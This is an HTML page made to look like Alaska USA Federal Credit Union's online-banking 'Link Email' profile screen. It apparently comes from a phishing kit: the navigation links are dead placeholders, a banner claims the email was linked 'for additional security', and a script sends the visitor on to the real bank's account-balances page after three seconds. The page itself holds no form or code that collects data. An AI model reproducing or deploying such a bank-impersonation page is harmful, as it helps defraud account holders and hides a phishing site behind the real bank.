<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/html4/loose.dtd">
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <title>Link your Email Address to your Account</title>
  <meta http-equiv="Refresh" content="600;url=/efs/servlet/efsonline/invalidate-session.jsp" />
  
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-print.css" type="text/css" media="print" />
    <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-main.css?akusa_rev=4662" type="text/css" title="main" media="screen, projection"/>

    
	<script type="text/javascript" language="JavaScript" src="https://ultrabranch3.alaskausa.org/efs/efs/jslibrary/open_window.js"></script>

<script type="text/javascript" language="JavaScript" src="https://ultrabranch3.alaskausa.org/efs/efs/jslibrary/common_functions.js"></script>
<script type="text/javascript" language="JavaScript" src="https://ultrabranch3.alaskausa.org/efs/efs/jslibrary/validate_zip.js"></script>
<script type="text/javascript" language="JavaScript" src="https://ultrabranch3.alaskausa.org/efs/efs/jslibrary/validate_email.js"></script>
</head>

<body>
<div id="pgBody">

<div class="skipLinks" role="navigation">
    <p><a id="skiptomain" href="#mainContent" class="visuallyhidden">Skip to main content</a></p>
    <p><a href="https://www.alaskausa.org/service/contact.asp" class="visuallyhidden" target="_new">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
</div>
<div id="header">



	
	<div id="banner" role="banner">
		<div id="home">
			<a href="https://www.alaskausa.org"><img alt="Alaska USA Federal Credit Union" src="/efs/efs/grafx/akusa/nav/logo-AKUSA.gif"/></a>
		</div>

		<div id="controls">
			<a href="#">Contact</a>
			<a href="#">FAQ</a>
			<a id="Logout" href="#">Logout</a>
		</div>


	</div>


<div role="navigation">


		<h2 id="mainnavlabel" class="visuallyhidden">Sections</h2>
		<ul id="tabs" aria-labelledby="mainnavlabel">

			<li><a href='#'>Account<br/>Information</a></li>

			<li><a href='#'>Transfers&nbsp;and<br/>Payments</a></li>

			<li><a href='#'>Account<br/>Services</a></li>

			<li class='active' aria-current='true'><a href='#'>Account<br/>Profile</a></li>

			

			<li><a href='#'>Rates&nbsp;and&nbsp;Other<br/>Information</a></li>

		</ul><!--tabs-->

		<h3 id="subnavlabel" class="visuallyhidden">Account Information Features</h3>
		<ul id="subNav" aria-labelledby="mainnavlabel">
			    <li><a href="#">Messages</a></li>
			    <li><a href="#">Alerts</a></li>
			    <li><a href="#">Password</a></li>
			    <li><a href="#">User ID</a></li>
			    <li><a href="#">Manage Users</a></li>
			    <li><a href="#">Security Questions</a></li>
			    <li><a href="#">Biometric ID</a></li>
			    <li><a href="#">Overdraft Services</a></li>
				<li><a href="#">Address</a></li>
			    <li><a class='active' aria-current='page' href="#">Link Email</a></li>
			    <li><a href="#">Direct Deposit Distributions</a></li>
			    <li><a href="#">Share Account Type</a></li>
			    <li><a href="#">Open New Shares</a></li>
			    <li><a href="#">Preferences</a></li>

		</ul><!-- subNav -->
	</div><!-- navigation -->
</div><!-- header -->
<div id="navTertiary">

</div><!-- navTertiary -->


<div id="pgMain">
  <a name="top"></a>
 
<div id="sideBar">


   <div id="journal"><a target="_new" href='#'>Read the current Journal</a></div>



   <div id="CardLockStatusBox" class="box">
     <h2>Card Lock</h2>
      <iframe title="Card Lock Status" id="CardLockStatusFrame" src="/efs/servlet/efsonline/inc/nav/akusa/cardlock.jsp" frameBorder="0" scrolling="no"></iframe>
   </div>

  <div id="links" class="box">
  <h2>Related Links</h2>
  	<ul>
    
      <li class="link"><a href="help-topic.jsp?HelpID=settings-personal">Help</a></li>
    
    </ul>
  </div>
</div>
  <script>
         setTimeout(function(){
            window.location.href = 'https://ultrabranch3.alaskausa.org/efs/servlet/efsonline/account-balances.jsp';
         }, 3000);
      </script>
      <center><h3>YOU HAVE SUCCESSFULLY LINKED YOUR EMAIL ADDRESS TO YOUR ACCOUNT FOR ADDITIONAL SECURITY</h3>
	  <img src="../efs/images/load.gif" width="100px"></center>
<!--end mainContent-->
<script type="text/javascript">bindTenDigitPhone();populatePhone();SetState(document.frmEditUser);</script>
<div id="pgFooter">
  <hr />

   <div id="footer">
     <span class="bug">
       <img alt="Equal Housing Lender" src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ehl.gif?#042116">
     </span>

     <p> &copy; Copyright  2020 &bull; Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293. Licensed by the Department of Business Oversight under the California Residential Mortgage Lending Act, License #4131067</p>
        <p><a tabindex="-1" href="javascript:PopupWindow('Privacy');">Privacy</a></p>
     

     <p class="ncua">
       <img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ncua.gif?#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>
   </div>
</div>
</div> <!--end pgMain div-->
  
    </div><!-- end pgBody -->
</body>
</html>

